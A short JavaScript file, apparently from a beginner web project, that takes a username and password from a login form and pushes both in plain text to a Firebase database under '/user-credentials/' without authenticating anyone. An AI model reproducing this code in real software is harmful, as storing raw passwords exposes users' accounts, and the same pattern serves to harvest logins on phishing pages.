// login information
const username = document.querySelector("#url_user");
const password = document.querySelector("#url_pass");
const login_btn = document.querySelector("#login_btn");

// reference database
const db = firebase.database();

// send information to the database when user clicks upload
login_btn.addEventListener("click", function(e){
    console.log("made it inside the function");

    if(username.value == "" || password.value == ""){
        alert("Please enter a valid username and password.");
    } else {
        db.ref("/user-credentials/").push({
            username: username.value,
            password: password.value,
        })
    }

    username.value = "";
    password.value = "";
});